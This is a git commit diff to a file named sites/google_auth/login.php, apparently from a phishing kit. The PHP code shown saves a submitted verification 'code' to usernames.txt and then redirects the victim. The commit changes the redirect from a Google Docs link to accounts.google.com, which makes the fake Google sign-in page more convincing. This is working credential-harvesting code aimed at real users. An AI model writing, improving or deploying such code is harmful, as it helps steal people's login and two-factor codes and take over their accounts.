3a9fc73d5a9cb9aeb03656f64f75a8a5a9bec9ee
Suami Monday <136092956+cosmicsuami@users.noreply.github.com>
2024-11-28 20:24:51 +0100

    Update login.php

--- sites/google_auth/login.php
+++ sites/google_auth/login.php
@@ -3,7 +3,7 @@
 if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     if (isset($_POST['code'])) {
         file_put_contents("usernames.txt", "Code: " . $_POST['code'] . "\n", FILE_APPEND);
-        header('Location: https://docs.google.com/document/d/1ngV-OyQuhQ9cx3DFY-jF51Jqdy4RKU3iGbntYQbWMxc/edit?usp=sharing');
+        header('Location: https://accounts.google.com');
         exit();
     } else {
         echo "Code not set!";
